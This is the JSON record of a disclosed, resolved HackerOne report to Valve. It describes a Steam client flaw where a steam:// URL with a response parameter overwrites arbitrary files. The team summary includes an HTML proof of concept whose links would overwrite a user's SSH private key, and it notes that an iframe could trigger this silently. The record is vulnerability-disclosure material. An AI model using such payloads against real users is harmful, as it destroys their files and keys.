{
  "id": 667242,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82NjcyNDI=",
  "url": "https://hackerone.com/reports/667242",
  "title": "[steam client] Opening a specific steam:// url overwrites files at an arbitrary location",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2019-08-04T21:24:19.731Z",
  "submitted_at": "2019-08-04T21:24:19.731Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "kbeckmann",
    "url": "/kbeckmann",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/063/948/e64cb44a81518d1cb14f48de27af5fa01d9c5c37_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 23363,
    "url": "https://hackerone.com/valve",
    "handle": "valve",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/363/c78d46a7d0ea39e3a15a7c19c1a48634f2571eb9_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/363/c78d46a7d0ea39e3a15a7c19c1a48634f2571eb9_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Valve",
      "twitter_handle": "",
      "website": "https://www.valvesoftware.com",
      "about": ""
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "no-content",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2020-09-22T18:48:14.138Z",
  "bug_reporter_agreed_on_going_public_at": "2020-09-21T15:17:41.155Z",
  "team_member_agreed_on_going_public_at": "2020-09-22T18:48:13.899Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "",
  "bounty_amount": "750.0",
  "formatted_bounty": "$750",
  "weakness": {
    "id": 6,
    "name": "Write-what-where Condition"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 79,
  "voters": [
    "nightshiba",
    "njbooher",
    "xploiterr",
    "discodamone",
    "foobar7",
    "mzfr",
    "gamer7112",
    "mvc",
    "excavator",
    "ali",
    "and 69 more..."
  ],
  "severity": {
    "rating": "medium",
    "score": 5.3,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "high",
      "privileges_required": "none",
      "user_interaction": "required",
      "scope": "unchanged",
      "confidentiality": "none",
      "integrity": "high",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 1285,
    "asset_type": "DOWNLOADABLE_EXECUTABLES",
    "asset_identifier": "steam.exe",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "id": 24562,
      "category": "team",
      "content": "If a user opens `steam://devkit-1/list-shortcuts?response=/tmp/testfile`, a file `/tmp/testfile` will be created containing the response to this request. Another problem with this is that the file will be *overwritten* if it already exists.\n\nThe owner of the file will be the same as the user that runs the steam client. This also means that we can overwrite and wipe out files that the user cares about, e.g. ssh keys, documents etc as long as we know the full path to those files.\n\nPOC: (the URL may also be visited with an iframe and thus doesn't require any user interaction)\n```\n<html>\n<head>\n  <title>Steam client POC</title>\n</head>\n\n<body>\n    <a href=\"steam://devkit-1/list-shortcuts?response=/tmp/testfile\">Create /tmp/testfile</a>\n    <a href=\"steam://devkit-1/list-shortcuts?response=/home/ubuntu/.ssh/id_rsa\">Overwrite /home/ubuntu/.ssh/id_rsa</a>\n</body>\n</html>\n```\n\n## Impact\n\nAn attacker can overwrite and wipe out files at an arbitrary location, as long as the steam client is executed with a user that can write to those files.\n\nA user's SSH keys, documents etc may be deleted as long as the attacker knows the full path to those files.\n",
      "user": {
        "id": 279011,
        "username": "mikela",
        "name": "Mike L",
        "bio": "",
        "cleared": false,
        "verified": false,
        "website": null,
        "location": "",
        "created_at": "2018-05-17T22:06:50.780Z",
        "url": "https://hackerone.com/mikela",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "company",
        "profile_picture_urls": {
          "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png",
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png",
          "xtralarge": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        }
      },
      "can_view?": true,
      "can_create?": false,
      "attachments": []
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
